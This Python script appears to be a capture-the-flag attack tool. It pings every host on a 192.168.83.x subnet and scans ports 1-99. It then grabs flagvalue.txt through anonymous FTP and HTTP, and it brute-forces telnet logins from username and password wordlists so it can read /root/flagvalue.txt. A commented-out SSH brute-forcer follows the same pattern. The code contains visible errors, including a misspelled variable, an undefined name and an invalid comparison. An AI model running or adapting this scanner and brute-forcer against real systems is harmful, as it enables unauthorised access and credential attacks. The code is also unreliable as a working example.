import os
import threading
import socket
import telnetlib
import time
import urllib
#import paramiko
from ftplib import FTP
result = []
n = 0
def ping(ip):
	ping = os.popen('ping '+ip).read()
	if 'TTL' in ping:port(ip)
def port(ip):
	socket.setdefaulttimeout(0.5)
	for port in range(1,100):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((ip,port))
			print(ip,port)
			if port == 21:ftp(ip)
			elif port == 23:telnet(ip)
			elif port == 80:http(ip)
#			elif port == 22:ssh(ip)
		except:pass
		finally:s.close()
def ftp(ip):
	ftp = FTP(ip,timeout=1)
	if '230' in ftp.login():down(ip,ftp)
def down(ip,ftp):
	try:
		result.append(ip)
		ftp.retrbinary('RETR flagvalue.txt',result.append)
	except:result.remove(ip)
def telnet(ip):
	for user in open('user.txt','rt'):
		for passwd in open('passwd.txt','rt'):
			user = user.strip('\n')
			passwd = passwd.strip('\n')
			tn = telnetlib.Telnet(ip,23,timeout=1)
			login = login_pw(tn,user,passwd)
			if login:break
		if login:
			wr = write(tn)
			result.extend([ip,wr])
			break
def login_pw(tn,user,passwd):
	tn.read_until('ogin:')
	tn.write(user+'\r')
	tn.read_until('assword:')
	tn.write(passwd+'\r')
	time.sleep(1)
	tn.read_some()
	n = tn.read_some()
	if 'from' in n:return 1
	elif '\n' in n:return 0
def write(tn):
	tn.read_until('#')
	tn.write('more /root/flagvalue.txt\r')
	tn.read_until('#')
	a = tn.read_very_lazy()
	tn.write('exit\r')
	return a
def http(ip):
	url = 'http://'+str(ip)+':80/flagvalue.txt'
	openurl = urllib.request.urlopen(url,timeout=1).read().decode('utf-8')
	if '\n' in oepnurl:openurl=openurl.strip('\n')
	result.extend([ip,port])
#def ssh(ip):
#	c = 0
#	for user in open('user.txt','rt'):
#		for passwd in open('passwd.txt','rt'):
#			user = user.strip('\n')
#			passwd = passwd.strip('\n')
#			ssh = paramiko.SSHClient()
#			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#			try:
#				ssh.connect(ip,port,name,passwd,timeout=2)
#				cmd = 'cat /root/flagvalue.txt'
#				stdin,stout,stderr = ssh.exec_command(cmd)
#				result.extend([ip,stout.read()])
#				break
#			except:continue
#		if c = 1:break
if __name__ == '__main__':
	thread = []
	for i in range(1,255):
		ip = '192.168.83.'+str(i)
		t1 = threading.Thread(target=ping,args=(ip,))
		t1.start()
		thread.append(t1)
	for t in thread:t.join()
	print(result)	
